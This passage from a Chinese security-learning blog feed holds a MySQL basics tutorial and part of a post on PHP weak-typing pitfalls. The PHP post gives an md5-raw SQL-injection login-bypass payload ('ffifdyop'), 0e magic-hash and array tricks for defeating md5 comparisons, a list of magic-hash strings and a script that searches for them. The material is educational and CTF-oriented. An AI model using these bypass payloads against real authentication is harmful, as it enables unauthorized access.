);</span><br></pre></td></tr></table></figure><p>如果数据是字符型，必须使用单引号或者双引号，如：”value”。</p><p>以下我们将使用 SQL <strong>INSERT INTO</strong> 语句向 MySQL 数据表 runoob_tbl 插入数据</p><p>以下实例中我们将向 runoob_tbl 表插入三条数据:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO runoob_tbl </span><br><span class="line">    -&gt; (runoob_title, runoob_author, submission_date)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&quot;学习 PHP&quot;, &quot;菜鸟教程&quot;, NOW());</span><br><span class="line">Query OK, 1 rows affected, 1 warnings (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO runoob_tbl</span><br><span class="line">    -&gt; (runoob_title, runoob_author, submission_date)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&quot;学习 MySQL&quot;, &quot;菜鸟教程&quot;, NOW());</span><br><span class="line">Query OK, 1 rows affected, 1 warnings (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; INSERT INTO runoob_tbl</span><br><span class="line">    -&gt; (runoob_title, runoob_author, submission_date)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&quot;JAVA 教程&quot;, &quot;RUNOOB.COM&quot;, &#x27;2016-05-06&#x27;);</span><br><span class="line">    </span><br><span class="line">Query OK, 1 rows affected (0.00 sec)</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong> </p><p>使用箭头标记 <strong>-&gt;</strong> 不是 SQL 语句的一部分，它仅仅表示一个新行，如果一条SQL语句太长，我们可以通过回车键来创建一个新行来编写 SQL 语句，SQL 语句的命令结束符为分号 <strong>;</strong></p><p>在以上实例中，我们并没有提供 runoob_id 的数据，因为该字段我们在创建表的时候已经设置它为 AUTO_INCREMENT(自动增加) 属性。 所以，该字段会自动递增而不需要我们去设置。实例中 NOW() 是一个 MySQL 函数，该函数返回日期和时间。</p><p>接下来我们可以通过以下语句查看数据表数据：</p><p>读取数据表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from runoob_tbl;</span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="https://www.runoob.com/wp-content/uploads/2014/03/71971E68-78B3-4964-AC4C-E75114D3B5B5.jpg" alt="img"></p><h1 id="10-MySQL-查询数据"><a href="#10-MySQL-查询数据" class="headerlink" title="10.MySQL 查询数据"></a>10.MySQL 查询数据</h1><p>MySQL 数据库使用SQL SELECT语句来查询数据。</p><p>你可以通过 mysql&gt; 命令提示窗口中在数据库中查询数据，或者通过PHP脚本来查询数据。</p><p>以下为在MySQL数据库中查询数据通用的 SELECT 语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name,column_name FROM table_name</span><br><span class="line">[WHERE Clause]</span><br><span class="line">[LIMIT N][ OFFSET M]</span><br></pre></td></tr></table></figure><ul><li>查询语句中你可以使用一个或者多个表，表之间使用逗号(,)分割，并使用WHERE语句来设定查询条件。</li><li>SELECT 命令可以读取一条或者多条记录。</li><li>你可以使用星号（*）来代替其他字段，SELECT语句会返回表的所有字段数据</li><li>你可以使用 WHERE 语句来包含任何条件。</li><li>你可以使用 LIMIT 属性来设定返回的记录数。</li><li>你可以通过OFFSET指定SELECT语句开始查询的数据偏移量。默认情况下偏移量为0。</li></ul><p>以下实例我们将通过 SQL SELECT 命令来获取 MySQL 数据表 runoob_tbl 的数据：</p><p>以下实例将返回数据表 runoob_tbl 的所有记录:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from runoob_tbl;</span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="https://www.runoob.com/wp-content/uploads/2014/03/DB742246-84F3-4447-BD43-6BAEADD7CA91.jpg" alt="img"></p><h1 id="11-MySQL-WHERE-子句"><a href="#11-MySQL-WHERE-子句" class="headerlink" title="11.MySQL WHERE 子句"></a>11.MySQL WHERE 子句</h1><p>我们知道从 MySQL 表中使用 SQL SELECT 语句来读取数据。</p><p>如需有条件地从表中选取数据，可将 WHERE 子句添加到 SELECT 语句中。</p><p>以下是 SQL SELECT 语句使用 WHERE 子句从数据表中读取数据的通用语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT field1, field2,...fieldN FROM table_name1, table_name2...</span><br><span class="line">[WHERE condition1 [AND [OR]] condition2.....</span><br></pre></td></tr></table></figure><ul><li>查询语句中你可以使用一个或者多个表，表之间使用逗号<strong>,</strong> 分割，并使用WHERE语句来设定查询条件。</li><li>你可以在 WHERE 子句中指定任何条件。</li><li>你可以使用 AND 或者 OR 指定一个或多个条件。</li><li>WHERE 子句也可以运用于 SQL 的 DELETE 或者 UPDATE 命令。</li><li>WHERE 子句类似于程序语言中的 if 条件，根据 MySQL 表中的字段值来读取指定的数据。</li></ul><p>以下实例将读取 runoob_tbl 表中 runoob_author 字段值为 Sanjay 的所有记录：</p><p>SQL SELECT WHERE 子句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from runoob_tbl WHERE runoob_author=&#x27;菜鸟教程&#x27;;</span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="https://www.runoob.com/wp-content/uploads/2014/03/CED9CA9C-E4C7-4809-875C-A7E48F430059.jpg" alt="img"></p><p>MySQL 的 WHERE 子句的字符串比较是不区分大小写的。 你可以使用 BINARY 关键字来设定 WHERE 子句的字符串比较是区分大小写的。</p><h1 id="12-基本操作"><a href="#12-基本操作" class="headerlink" title="12.基本操作"></a>12.基本操作</h1><h3 id="1-数据库的增删改查"><a href="#1-数据库的增删改查" class="headerlink" title="1. 数据库的增删改查"></a>1. <strong>数据库的增删改查</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">增：create database db1;</span><br><span class="line"></span><br><span class="line">删：drop database db1;</span><br><span class="line"></span><br><span class="line">改：alter database db1 charset utf8</span><br><span class="line"></span><br><span class="line">查：show databases;#查看所有的数据库</span><br></pre></td></tr></table></figure><h3 id="2-查看表结构"><a href="#2-查看表结构" class="headerlink" title="2.查看表结构"></a>2.<strong>查看表结构</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">desc 表名；</span><br><span class="line"></span><br><span class="line">describe 表名;</span><br></pre></td></tr></table></figure><h3 id="3-查看表的内容"><a href="#3-查看表的内容" class="headerlink" title="3.查看表的内容"></a>3.查看表的内容</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from runoob_tbl;</span><br></pre></td></tr></table></figure><h3 id="4-查看指定的数据库"><a href="#4-查看指定的数据库" class="headerlink" title="4.查看指定的数据库"></a>4.查看指定的数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show create database db1;</span><br></pre></td></tr></table></figure><h3 id="5-选择数据库"><a href="#5-选择数据库" class="headerlink" title="5.选择数据库"></a>5.选择数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use db1</span><br></pre></td></tr></table></figure><h3 id="6-显示一些系统特定资源的信息"><a href="#6-显示一些系统特定资源的信息" class="headerlink" title="6.显示一些系统特定资源的信息"></a>6.显示一些系统特定资源的信息</h3><p>例如，正在运行的线程数量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show status;  </span><br></pre></td></tr></table></figure><h3 id="7-查看当前库里面所有的表"><a href="#7-查看当前库里面所有的表" class="headerlink" title="7.查看当前库里面所有的表"></a>7.查看当前库里面所有的表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure><h3 id="8-查看当前数据库-里面的表user-用户为root的密码"><a href="#8-查看当前数据库-里面的表user-用户为root的密码" class="headerlink" title="8.查看当前数据库 里面的表user 用户为root的密码"></a>8.查看当前数据库 里面的表user 用户为root的密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select password from user where user=&#x27;root&#x27;;</span><br></pre></td></tr></table></figure><h3 id="9-建立表"><a href="#9-建立表" class="headerlink" title="9.建立表"></a>9.建立表</h3><p>完整的建立表的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">create table users</span><br><span class="line"></span><br><span class="line">(id int(7) AUTO_INCREMENT,</span><br><span class="line"></span><br><span class="line">username varchar(100) not null,</span><br><span class="line"></span><br><span class="line">password varchar(100) not null,</span><br><span class="line"></span><br><span class="line">PRIMARY KEY(id)</span><br><span class="line"></span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table users</span><br><span class="line">(id int(7) UNSIGNED auto_increment,</span><br><span class="line">username varchar(30) not null,</span><br><span class="line">password varchar(32) not null,email varchar(40),</span><br><span class="line">primary key (id))engine=myisam default charset=utf8;</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE 表名 </span><br><span class="line"></span><br><span class="line">(</span><br><span class="line"></span><br><span class="line">属性名 数据类型 [完整约束条件],</span><br><span class="line"></span><br><span class="line">属性名 数据类型 [完整约束条件],</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">属性名 数据类型 [完整约束条件]</span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>字段名就是属性名</p><h3 id="10-约束条件"><a href="#10-约束条件" class="headerlink" title="10.约束条件"></a>10.约束条件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PRIMARY KEY 标识该属性为该表的主键，可以唯一的标识对应的元组</span><br><span class="line"></span><br><span class="line">FOREIGN KEY 标识该属性为该表的外键，是与之联系某表的主键</span><br><span class="line"></span><br><span class="line">NOT NULL标识该属性不能为空</span><br><span class="line"></span><br><span class="line">UNIQUE 标识该属性的值是唯一的</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">AUTO_INCREMENT标识该属性的值是自动增加，这是MySQL的SQL语句的特色</span><br><span class="line"></span><br><span class="line">DEFAULT 为该属性设置默认值</span><br></pre></td></tr></table></figure><h1 id="13-数据的增删改查"><a href="#13-数据的增删改查" class="headerlink" title="13.数据的增删改查"></a>13.数据的增删改查</h1><p>为表中所有字段添加数据</p><p>语法：INSERT INTO 表名（字段名1，字段名2，…）VALUES（值1，值2，…）；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into users (id,username,password)values(1,&#x27;moon&#x27;,&#x27;123456&#x27;);</span><br></pre></td></tr></table></figure><h2 id="1-1-增"><a href="#1-1-增" class="headerlink" title="1.1. 增"></a>1.1. 增</h2><p>语法：INSERT INTO 表名（字段1，字段2，…）VALUES(值1，值2，…）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into users values(null,&#x27;test&#x27;,&#x27;123456&#x27;);</span><br></pre></td></tr></table></figure><p>同时添加多条数据</p><p>语法：INSERT INTO 表名[(字段名1，字段名2，…)]VALUES （值1，值2，…），（值1，值2，…），</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into users (id,username,password)values(null,&#x27;moon&#x27;,&#x27;123456&#x27;),(null,&#x27;alex&#x27;,&#x27;123456&#x27;);</span><br></pre></td></tr></table></figure><p>INSERT INTO 表名[(字段名1，字段名2，…)]VALUES （值1，值2，…），（值1，值2，…），（值1，值2，…）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into sb values(null,&#x27;moon1&#x27;,&#x27;123456&#x27;),</span><br><span class="line">(null,&#x27;alex1&#x27;,&#x27;123456&#x27;);</span><br></pre></td></tr></table></figure><h2 id="1-2-删"><a href="#1-2-删" class="headerlink" title="1.2. 删"></a>1.2. 删</h2><p>DELETE FROM 表名 [WHERE 条件表达式]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from sb where id=1;</span><br></pre></td></tr></table></figure><p>删除全部数据</p><p>若 DELETE 语句中没有使用WHERE语句，则会将表中所有记录都删除。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM 表名</span><br></pre></td></tr></table></figure><h2 id="1-3-更新"><a href="#1-3-更新" class="headerlink" title="1.3. 更新"></a>1.3. <strong>更新</strong></h2><p>语法：UPDATE 表名 SET 字段名1=值1，[ ，字段名2=值2，…][ WHERE 条件表达式 ]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">update sb set  password=&#x27;aaaa&#x27; where id=2;</span><br><span class="line">update sb set  password=&#x27;sb&#x27;,username=&#x27;moon&#x27; where id=4</span><br><span class="line">update sb set  password=456789;</span><br></pre></td></tr></table></figure><h2 id="1-4-查"><a href="#1-4-查" class="headerlink" title="1.4. 查"></a>1.4. <strong>查</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from sb;</span><br></pre></td></tr></table></figure><p>星号代表所有的字段</p><p>查询指定的字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from users;</span><br></pre></td></tr></table></figure><p>按条件查询</p><p>语法：SELECT 字段名1，字段名2，…FROM 表名WHERE 条件表达式</p><p>带 BETWEEN AND 关键字的查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from sb where id not between 1 and 10;</span><br></pre></td></tr></table></figure><p>带 DISTINCT 关键字的查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct username from sb;</span><br></pre></td></tr></table></figure><p>like查询 一般都会给跟着%</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username like &quot;%m%&quot; ;</span><br></pre></td></tr></table></figure><p>下划线 _ 匹配一个字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select* from users where username like &quot;moo_&quot;;</span><br></pre></td></tr></table></figure><p>and查询</p><p>满足多个条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from sb where id=2 and username=&#x27;test&#x27;;</span><br></pre></td></tr></table></figure><p>or查询</p><p>满足任意一个条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from sb where id=1 or username=&#x27;moon&#x27;;</span><br></pre></td></tr></table></figure><p>OR 和 AND 一起使用的情况</p><p>OR 和 AND 一起使用的时候，AND 的优先级高于 OR，因此二者一起使用时，会先运算 AND 两边的表达式，再运算 OR 两边的表达式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from sb where id &gt;5 and password=&#x27;123456c&#x27; or username=&#x27;moon1&#x27;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP--安全特性</title>
      <link href="/posts/fba9.html"/>
      <url>/posts/fba9.html</url>
      
        <content type="html"><![CDATA[<h2 id="强类型与弱类型"><a href="#强类型与弱类型" class="headerlink" title="强类型与弱类型"></a>强类型与弱类型</h2><p><strong>强类型</strong></p><ul><li><p>所谓强类型(Strongly typed)，顾名思义就是强制数据类型定义的语言。也就是说，一旦一个变量被指定了某个数据类型，如果不经过强制转换，那么它就永远是这个数据类型。J</p></li><li><p>java、.NET、C++等都是强类型语言，在变量使用之前必须声明变量的类型和名称；且不经强制转换不允许两种不同类型的变量互相操作。</p></li></ul><p><strong>弱类型</strong></p><ul><li>对数据的类型要求并不严格，可以让数据类型互相转换。</li></ul><h2 id="PHP中“-”和“-”"><a href="#PHP中“-”和“-”" class="headerlink" title="PHP中“==”和“===”"></a>PHP中“==”和“===”</h2><p>“==”和“===”都是用来比较两个数值是否相等的操作符。</p><p>当比较的两个值都是相同类型时候“==”和“===”是相等的。</p><p>1==1（两个int）1.0==1.0（两个float）‘H1TerHub’==’H1TerHub‘（两个字符串）</p><p><strong>ATTENTION：在前后两个值的类型不一样的时候，‘==’会自动转换类型</strong></p><p><img src="https://i.loli.net/2021/09/28/3VSoM1K6I4dtmlg.png" alt="img"></p><p>一般看到“==”就可以关注是否存在弱类型比较</p><h3 id="“-”类型转换的规则"><a href="#“-”类型转换的规则" class="headerlink" title="“==”类型转换的规则"></a>“==”类型转换的规则</h3><p>1、字符串和数字比较，字符串会被转换成数字。</p><p>“admin”==0(true)//admin被转换成数字，由于admin是字符串，转换失败，int（admin）=0，所以比较结果是true。</p><p>2、混合字符串转换成数字，看字符串的第一个。</p><p>“1admin”==1 “2admin”==2</p><p>3、字符串开头以xex开头，x代表数字。会被转换成科学计数法。</p><p>x*10^x的形式。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">‘2e2’=2*10^2=200</span><br><span class="line">“-2e2”=-2*10^2 “0e2”=0*10^2=0 </span><br><span class="line">“hh-2e2”=0</span><br><span class="line">“1hh-2e2”=1</span><br></pre></td></tr></table></figure><p><img src="https://www.runoob.com/wp-content/uploads/2019/05/1791863413-572055b100304_articlex.png" alt="img"></p><p>bool类型的true跟任意字符串可以弱类型相等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span> == “H1TerHub”)&#123;</span><br><span class="line"><span class="keyword">echo</span> “success”;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="强-弱比较"><a href="#强-弱比较" class="headerlink" title="强|弱比较"></a>强|弱比较</h2><ul><li><p>强比较<code>===</code>：先比较类型是否相同；再比较值</p></li><li><p>弱类型比较<code>==</code>：会将字符类型转换为相同类型，在比较值</p><p>ps：若比较数字和字符串 | 涉及数字内容的字符串；则字符串会转换为数值并按数值进行比较</p></li></ul><blockquote><p>eg：</p><p>当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内 该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin&quot;</span>==<span class="number">0</span>);    <span class="comment">//true         </span></span><br><span class="line"><span class="comment"># admin为字符串，转换即为0var_dump(&quot;1admin&quot;==1);   //true            </span></span><br><span class="line"><span class="comment"># 字符串中的数值的开始部分决定了其值var_dump(&quot;admin1&quot;==1)    //false         </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">0</span>)    <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e4456789&quot;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="comment"># 将0e|0E识别为科学计数法；而0的n次方始终为0，故相等Copy</span></span><br></pre></td></tr></table></figure></blockquote><p><a href="https://www.php.net/manual/zh/types.comparisons.php">PHP: PHP 类型比较表 - Manual</a></p><h2 id="一些php函数"><a href="#一些php函数" class="headerlink" title="一些php函数"></a>一些php函数</h2><h4 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(string,raw)</span><br></pre></td></tr></table></figure><ul><li>String: 必需，为要计算的字符串</li><li>Raw:<ul><li>true： 原始16字符二进制格式</li><li>false：32字符十六进制数（默认）</li></ul></li></ul><p>利用md5($pass,true)构造万能密码sql注入</p><p>后端查询语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">where</span> password<span class="operator">=</span>md5($pass,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p>若MD5值经hex转换为字符串后为’or’+balabala这样的字符串；那么拼接的查询语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `admin` <span class="keyword">where</span> password<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;balabala&#x27;</span></span><br></pre></td></tr></table></figure><p>当’or’后的值为true时，即可构成万能密码；在此利用到一个mysql特性： <code>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数</code>（测试时发现只要是数字都可以） (ps：这种情况必须有单引号括起来 如<code>password=&#39;xxx&#39; or &#39;1xxxxxxxxx&#39;</code>就相当于<code>password=&#39;xxx&#39; or 1</code>；故返回值为true)</p><p>常用payload：<code>ffifdyop</code></p><h5 id="md5强碰撞脚本"><a href="#md5强碰撞脚本" class="headerlink" title="md5强碰撞脚本"></a>md5强碰撞脚本</h5><p><a href="https://segmentfault.com/a/1190000039189857">浅谈md5弱类型比较和强碰撞 - 合天网安</a></p><h5 id="弱比较bypass"><a href="#弱比较bypass" class="headerlink" title="弱比较bypass"></a>弱比较bypass</h5><p>md5弱比较形式：<br><code>if($a != $b &amp;&amp; md5($a) == md5($b))</code><br>这里有两种方法</p><ul><li>0e绕过</li><li>数组绕过</li></ul><p>0e绕过：是md5加密后是0exxxxx的形式，在==弱比较时，会被当做科学技术法，众所周知，0的任何次方都是0，自然判断为true<br>大佬整理的<a href="https://github.com/spaze/hashes/blob/master/md5.md">md5加密后0e开头</a></p><p>数组绕过：a[]=a&amp;b[]=b，传入参数为数组则MD5返回NULL，null=null，判断为true，成功绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">一些md5编码后得到<span class="number">0</span>exxx（此处xxx为十进制字符）的字符串</span><br><span class="line">原字符串                    md5值</span><br><span class="line">QNKCDZO         <span class="number">0e830400451993494058024219903391</span></span><br><span class="line"><span class="number">240610708</span>       <span class="number">0e462097431906509019562988736854</span></span><br><span class="line">aabg7XSs        <span class="number">0e087386482136013740957780965295</span></span><br><span class="line">aabC9RqS        <span class="number">0e041022518165728065344349536299</span></span><br><span class="line">s878926199a     <span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a     <span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a     <span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a     <span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a     <span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a    <span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a    <span class="number">0e509367213418206700842008763514</span></span><br><span class="line">qebi7zl0        <span class="number">0e649420541288950724577306786996</span></span><br><span class="line">qebaur5g        <span class="number">0e352312259284787676841028696030</span></span><br><span class="line">qe20k7jl        <span class="number">0e416004725936696827118806457976</span></span><br><span class="line">qe9vwdjf        <span class="number">0e288029216666843876260611249898</span></span><br></pre></td></tr></table></figure><p>补一些脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成md5值为0exxx，还有一些套娃关卡的第一关也是要求验证码，改一下就能用了</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">l = <span class="string">&#x27;qwertyuiopasdfghjklzxcvbnm1234567890&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> l:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> l:    </span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> l:        </span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> l:            </span><br><span class="line">                    <span class="keyword">for</span> o <span class="keyword">in</span> l:                </span><br><span class="line">                        <span class="keyword">for</span> p <span class="keyword">in</span> l:                    </span><br><span class="line">                            <span class="keyword">for</span> q <span class="keyword">in</span> l:                        </span><br><span class="line">                                f = i + j + k + m + n + o + p + q                        </span><br><span class="line">                                md5 = hashlib.md5(f.encode(encoding=<span class="string">&#x27;UTF-8&#x27;</span>)).hexdigest()                        </span><br><span class="line">                                <span class="keyword">if</span> md5[:<span class="number">2</span>] == <span class="string">&#x27;0e&#x27;</span> <span class="keyword">and</span> <span class="built_in">str</span>.isdigit(md5[<span class="number">2</span>:]):                            </span><br><span class="line">                                    <span class="built_in">print</span>(f)                            </span><br><span class="line">                                    <span class="built_in">print</span>(md5)</span><br></pre></td></tr></table></figure><p><strong>加密后弱相等</strong></p><p>形式如下：<br><code>if 